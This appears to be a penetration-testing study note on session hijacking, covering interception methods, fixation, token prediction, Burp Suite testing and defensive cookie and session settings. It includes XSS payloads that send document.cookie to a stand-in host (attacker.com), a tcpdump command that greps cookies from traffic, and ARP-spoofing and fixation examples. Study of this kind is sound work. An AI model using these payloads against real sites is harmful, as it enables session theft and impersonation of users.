2026-02-04 17:44

Status:

Tags:[[eWPTX]] [[Authentication]] [[Session Management]]
###### Prerequisites: [[Session Management Testing]]
# Session Hijacking

## Definition

Session hijacking (cookie theft) occurs when an attacker obtains an active session token and uses it to impersonate the user.

---

## How it works (high level)

1) session establishment: user logs in → server issues session ID
2) token interception: attacker obtains session ID (several paths)
3) takeover: attacker replays token to the app
4) exploitation: attacker acts as the victim

---

## Common interception methods

- sniffing (unencrypted traffic)
- MitM interception
- XSS cookie theft (if cookie not `HttpOnly`)
- predictable/weak session IDs

---

## Attack Techniques in Detail

### XSS-Based Session Theft

If `HttpOnly` is not set on session cookies, JavaScript can read them directly:

```html
<script>new Image().src="https://attacker.com/steal?c="+document.cookie</script>
```

Alternative payloads for different contexts:

```html
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
<svg onload="navigator.sendBeacon('https://attacker.com/steal',document.cookie)">
```

### Network Sniffing

When traffic is unencrypted (HTTP), session tokens travel in cleartext:

- **Wireshark**: filter with `http.cookie` to isolate session tokens in captured traffic
- **Bettercap**: use for ARP spoofing on local networks to intercept traffic between victim and gateway
- **tcpdump**: `tcpdump -i eth0 -A 'port 80' | grep -i 'cookie'`

### Session Fixation vs Hijacking

| Aspect | Session Fixation | Session Hijacking |
|--------|-----------------|-------------------|
| Timing | Before authentication | After authentication |
| Method | Attacker sets/forces a known session ID on the victim | Attacker steals an existing valid session ID |
| Flow | Attacker plants token → victim authenticates → token is now privileged | Victim authenticates → attacker intercepts/steals the token |

Session fixation example: attacker sends victim a link with a preset session ID:
```
https://target.com/login?PHPSESSID=attacker_known_value
```

### Session Prediction

Weak session tokens can be guessed or predicted:

- **Sequential IDs**: incrementing integers (`session=10001`, `session=10002`)
- **Timestamp-based**: tokens derived from `time()` or epoch values
- **Weak PRNG**: predictable random number generators (e.g., `rand()` in PHP without proper seeding)
- **Short tokens**: insufficient entropy, vulnerable to brute-force

---

## Burp Suite Methodology

### Sequencer (Entropy Analysis)

1. Capture a request that returns a session token (login response)
2. Send to Sequencer → configure token location
3. Start live capture (collect 10,000+ tokens)
4. Analyze: overall quality, character-level analysis, bit-level analysis
5. A good token should show >100 bits of effective entropy

### Replaying Stolen Tokens

1. Capture any authenticated request in Proxy
2. Send to Repeater
3. Replace the session cookie with the stolen token value
4. Send the request — if 200 OK with authenticated content, hijack confirmed

---

## Real-World Testing Approach

### Token Randomness Checks

- Collect 100+ session tokens and check for patterns
- Look for base64-encoded structured data (decode and inspect)
- Check if tokens change on each login (rotation)
- Verify token length is sufficient (>128 bits of randomness)

### Cookie Flag Audit

| Flag | Purpose | Test |
|------|---------|------|
| `Secure` | Only sent over HTTPS | Attempt to capture cookie over HTTP |
| `HttpOnly` | Not accessible via JavaScript | Run `document.cookie` in browser console |
| `SameSite=Strict/Lax` | Prevents cross-site sending | Test CSRF-style cross-origin requests |
| `Path` | Limits cookie scope | Check if cookie is sent to unintended paths |
| `Expires/Max-Age` | Controls lifetime | Check if session cookies persist too long |

---

## Defensive checks

- enforce HTTPS + `Secure` cookies
- set `HttpOnly` and appropriate `SameSite`
- rotate session IDs on privilege changes (e.g., `session_regenerate_id(true)` in PHP)
- bind sessions to risk signals carefully (IP/UA/device fingerprints)
- implement absolute session timeout (e.g., 30 minutes) and idle timeout (e.g., 10 minutes)
- invalidate sessions server-side on logout (delete from session store, not just client cookie)
- use sufficiently long, cryptographically random tokens (e.g., `/dev/urandom`, `secrets.token_hex(32)` in Python)
- monitor for concurrent sessions from different IPs and alert or terminate
